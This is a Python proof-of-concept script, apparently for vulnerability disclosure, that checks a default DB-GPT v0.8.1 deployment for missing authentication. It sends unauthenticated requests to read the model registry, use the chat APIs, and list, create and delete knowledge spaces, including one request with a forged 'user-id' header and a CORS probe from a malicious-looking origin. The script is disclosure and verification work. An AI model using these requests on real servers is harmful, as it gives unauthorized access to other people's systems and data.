#!/usr/bin/env python3
# -*- coding: utf-8 -*-
r"""
PoC — DB-GPT v0.8.1 default deployment serves the entire Web/API surface without authentication
================================================================================================
CWE-306: Missing Authentication for Critical Function

Affected product: DB-GPT v0.8.1 (eosphoros-ai/DB-GPT)
Affected component: the entire Web/API surface (default configuration, exposed out of the box)
    - packages/dbgpt-app/src/dbgpt_app/dbgpt_server.py:55-88
        mount_routers() mounts 120+ routes (chat / knowledge spaces / model
        controller / agents) with no authentication middleware
    - packages/dbgpt-serve/src/dbgpt_serve/utils/auth.py:25-38
        get_user_from_headers() is a mock: regardless of whether a user-id
        header is sent, it always returns role="admin"
    - packages/dbgpt-app/src/dbgpt_app/openapi/api_v2.py:43-68
        check_api_key() fails open (returns None) when api_keys is empty
        (the default), letting every request through unchecked
    - packages/dbgpt-app/src/dbgpt_app/knowledge/api.py:84-130
        knowledge-space endpoints with inconsistent authentication: the
        identity dependency declared by space_add is never used; space_list /
        space_delete declare none at all
    - packages/dbgpt-app/src/dbgpt_app/dbgpt_server.py:264-270
        CORS configured with allow_origins=["*"] and allow_credentials=True

Vulnerability summary:
  DB-GPT v0.8.1 under its default deployment (out of the box) has no effective
  authentication/authorization on any Web/API endpoint:
  1. 120+ endpoints (model controller, worker inference, knowledge spaces,
     chat API) require no authentication.
  2. The nominal "authentication" (get_user_from_headers) is mock code that
     unconditionally returns the admin role; identity is fully decided by the
     client-controlled user-id header.
  3. The V2 API key check (check_api_key) fails open when api_keys is empty
     (the default), making it ineffective.
  4. CORS allows any origin cross-domain with credentials.
  Any network-reachable attacker can, without any credential: read model
  registry information, drive full LLM conversations (consuming inference
  quota), create / list / delete arbitrary knowledge spaces, manage data
  sources, and gain a complete unauthenticated entry point for follow-on
  exploitation (such as code-execution capabilities).

Trigger conditions:
  Service started with the default configuration (api_keys unconfigured),
  listening on 0.0.0.0:5670; the attacker only needs network reachability.
  No prerequisites.

Impact:
  Unauthenticated access to every sensitive endpoint; confidentiality,
  integrity, and availability all affected.

Verification logic (through the real service API, end to end):
  [PREREQ]   Confirm the DB-GPT service is reachable (GET /api/controller/models -> 200)
  [STEP 1]   Read the model-controller model registry without authentication
             -> full model list returned
  [STEP 2]   Call the V2 Chat API with no Authorization header at all
             -> no 401; the request enters business/request validation (E0001)
             -> proves check_api_key fails open
  [STEP 3]   List all knowledge spaces without authentication (POST /knowledge/space/list {})
  [STEP 4]   Create a knowledge space carrying a forged user-id header -> creation
             succeeds and the identity is trusted (the server-side space is the
             marker artifact of the unauthorized write)
  [STEP 5]   Cross-origin preflight OPTIONS with a malicious Origin -> any origin
             allowed + credentials allowed
  [STEP 6]   Full unauthenticated LLM conversation (soft check)
             -> real model reply; full functionality with zero credentials
  [CLEANUP]  Delete the test space created in STEP 4 (also demonstrating
             unauthenticated deletion)

Test environment:
  - DB-GPT v0.8.1 service (default configuration, http://localhost:5670)
  - Python 3.11+ (urllib standard library only, no extra dependencies)
  - Windows 11 / Linux (cross-platform)

Usage:
  python PoC.py [--target http://localhost:5670]
"""

import json
import os
import sys
import tempfile
import uuid
import urllib.error
import urllib.request

TARGET = "http://localhost:5670"
if len(sys.argv) > 2 and sys.argv[1] == "--target":
    TARGET = sys.argv[2]

PASSED = 0
FAILED = 0
WARNED = 0


def check(name: str, condition: bool, detail: str = "") -> None:
    """Record a single check result, printed as [PASS] or [FAIL]."""
    global PASSED, FAILED
    if condition:
        PASSED += 1
        print(f"  \033[92m[PASS]\033[0m {name}  {detail}")
    else:
        FAILED += 1
        print(f"  \033[91m[FAIL]\033[0m {name}  {detail}")


def warn(name: str, detail: str = "") -> None:
    """Record a soft-check result (not counted in pass/fail)."""
    global WARNED
    WARNED += 1
    print(f"  \033[93m[WARN]\033[0m {name}  {detail}")


def _send(method: str, path: str, body=None, headers=None, timeout: int = 30):
    """Send an HTTP request; return (status code, response text, header dict)."""
    data = json.dumps(body).encode("utf-8") if body is not None else None
    h = {"Content-Type": "application/json"}
    if headers:
        h.update(headers)
    req = urllib.request.Request(TARGET + path, data=data, headers=h, method=method)
    try:
        resp = urllib.request.urlopen(req, timeout=timeout)
        return resp.status, resp.read().decode("utf-8", "replace"), resp.headers
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace"), e.headers
    except Exception as e:
        return 0, f"{{'error': {str(e)!r}}}", {}


def api(method: str, path: str, body=None, headers=None, timeout: int = 30):
    """Send an HTTP request; return (status code, response text)."""
    code, text, _ = _send(method, path, body, headers, timeout)
    return code, text


def main() -> bool:
    global PASSED, FAILED, WARNED
    print()
    print("\033[1;36m" + "=" * 62 + "\033[0m")
    print("\033[1;36m  DB-GPT v0.8.1")
    print("  Default deployment: entire Web/API surface without authentication  PoC\033[0m")
    print(f"\033[1;36m  Target: {TARGET}\033[0m")
    print("\033[1;36m" + "=" * 62 + "\033[0m")
    print()

    # ── Prerequisite: service reachable ──
    print("\033[1;33m[PREREQ] Confirm the DB-GPT service is reachable\033[0m")
    code, body = api("GET", "/api/controller/models")
    check("service reachable", code == 200, f"HTTP {code}")
    if code != 200:
        print("  Start the service first: dbgpt start webserver -c <your-config>.toml -y")
        return False
    print()

    # ── STEP 1: read the model-controller registry without authentication ──
    print("\033[1;33m[STEP 1] Read the model-controller model registry without authentication\033[0m")
    code, body = api("GET", "/api/controller/models")
    names = []
    try:
        names = [m["model_name"] for m in json.loads(body) if m.get("model_name")]
    except Exception:
        pass
    check("model registry reachable without authentication (model information disclosed)",
          code == 200 and bool(names),
          f"HTTP {code}  registered models: {', '.join(names) or 'N/A'}")
    print()

    # ── STEP 2: V2 Chat API fail-open ──
    print("\033[1;33m[STEP 2] Call the V2 Chat API without authentication (fail-open check)\033[0m")
    code, body = api("POST", "/api/v2/chat/completions",
                     {"chat_mode": "chat_normal", "user_input": "hi",
                      "model_name": "deepseek-v4-pro"})
    # No Authorization header at all. If check_api_key were effective, this would
    # return 401; the actual response enters request validation (E0001), proving
    # that with api_keys empty the key check is ineffective (fail-open).
    check("no 401 returned (authentication bypassed)", code != 401 and "invalid_api_key" not in body,
          f"HTTP {code}")
    check("request reached the business/validation stage", "E0001" in body or '"success"' in body,
          f"response: {body[:120]!r}")
    print()

    # ── STEP 3: list all knowledge spaces without authentication ──
    print("\033[1;33m[STEP 3] List all knowledge spaces without authentication\033[0m")
    code, body = api("POST", "/knowledge/space/list", {})
    check("knowledge-space endpoint reachable without authentication", code == 200 and '"success":true' in body,
          f"HTTP {code}")
    print()

    # ── STEP 4: create a knowledge space with a forged identity (mock auth trusts the client) ──
    print("\033[1;33m[STEP 4] Create a knowledge space with a forged user-id header\033[0m")
    space_name = "dbgpt-poc-space-" + uuid.uuid4().hex[:8]
    print(f"  test space name: {space_name}")
    code, body = api("POST", "/knowledge/space/add",
                     {"name": space_name, "vector_type": "Chroma",
                      "desc": "zero-auth verification"},
                     headers={"user-id": "forged-attacker"})
    check("space created with forged identity (marker artifact of unauthorized write)",
          code == 200 and '"success":true' in body, f"HTTP {code}")
    print()

    # ── STEP 5: CORS any origin ──
    print("\033[1;33m[STEP 5] Cross-origin preflight (CORS configuration check)\033[0m")
    code, body, resp_headers = _send(
        "OPTIONS", "/api/v1/chat/completions",
        headers={"Origin": "http://evil.example.com",
                 "Access-Control-Request-Method": "POST"})
    ao = resp_headers.get("access-control-allow-origin", "") if resp_headers else ""
    ac = resp_headers.get("access-control-allow-credentials", "") if resp_headers else ""
    check("any-origin CORS with credentials allowed",
          bool(ao) and ac.lower() == "true",
          f"allow-origin={ao or '(none)'}  allow-credentials={ac or '(none)'}")
    print()

    # ── STEP 6: full unauthenticated LLM conversation (soft check) ──
    print("\033[1;33m[STEP 6] Full unauthenticated LLM conversation (soft check)\033[0m")
    code, body = api("POST", "/api/v1/chat/completions",
                     {"chat_mode": "chat_normal", "model_name": "deepseek-v4-pro",
                      "user_input": "say OK", "temperature": 0},
                     timeout=90)
    if code == 200 and '"content"' in body and '"OK"' in body:
        check("unauthenticated conversation returned model output (full functionality, zero credentials)", True, "model replied 'OK'")
    else:
        warn("unauthenticated LLM conversation", f"HTTP {code} (LLM backend unavailability does not affect the zero-authentication verdict)")
    print()

    # ── Cleanup: delete the test space ──
    print("\033[1;33m[CLEANUP] Delete the test knowledge space\033[0m")
    code, body = api("POST", "/knowledge/space/delete", {"name": space_name})
    check("test space deleted (also demonstrates unauthenticated deletion)",
          code == 200 and '"success":true' in body, f"HTTP {code}")
    print()

    # ── Marker file ──
    total = PASSED + FAILED
    marker = os.path.join(tempfile.gettempdir(), "dbgpt_zeroauth_poc_marker.txt")
    with open(marker, "w", encoding="utf-8") as f:
        f.write(f"DBGPT_ZERO_AUTH_POC {PASSED}/{total}\n")
    print(f"  marker file written: {marker}")

    # ── Summary ──
    print("\033[1;36m" + "=" * 62 + "\033[0m")
    print(f"\033[1;36m  Result: {PASSED}/{total} passed\033[0m")
    if WARNED:
        print(f"\033[1;33m  Soft-check warnings: {WARNED} (do not affect the zero-authentication verdict)\033[0m")
    if FAILED == 0:
        print("\033[1;36m  Verdict: \033[91mVULNERABLE\033[0m")
        print("\033[1;36m  Default-deployment zero-authentication across the Web/API surface confirmed\033[0m")
    else:
        print("\033[1;33m  Verdict: some checks failed - check the service state\033[0m")
    print("\033[1;36m" + "=" * 62 + "\033[0m")
    print()
    print("Root cause:")
    print("  dbgpt_server.py:55-88   - mount_routers() mounts all routes with no authentication middleware")
    print("  auth.py:25-38           - get_user_from_headers() mock authentication, always role=admin")
    print("  api_v2.py:43-68         - check_api_key() fails open (returns None) when api_keys is empty")
    print("  knowledge/api.py:84-130 - knowledge-space endpoints with inconsistent/missing authentication")
    print("  dbgpt_server.py:264-270 - CORS allow_origins=[\"*\"] + allow_credentials=True")
    print("  -> any network-reachable attacker reaches every Web/API capability without credentials -> CWE-306")
    print()

    return FAILED == 0


if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)
